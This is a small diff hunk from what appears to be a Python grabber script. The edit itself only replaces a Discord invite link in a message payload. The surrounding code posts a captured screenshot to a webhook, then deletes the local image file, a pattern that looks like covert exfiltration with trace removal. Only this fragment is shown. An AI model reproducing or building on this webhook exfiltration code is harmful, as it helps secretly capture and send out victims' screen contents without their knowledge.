@@ -1250,6 +1250,6 @@ requests.post(whook, files=files)
 files["screenshot"].close()
 os.remove("screenshot.png")
 
-payload = {"content": "https://discord.gg/fnNd26Depz"}
+payload = {"content": "https://discord.gg/mSXNaZXV42"}
 
 response = requests.post(whook, json=payload)
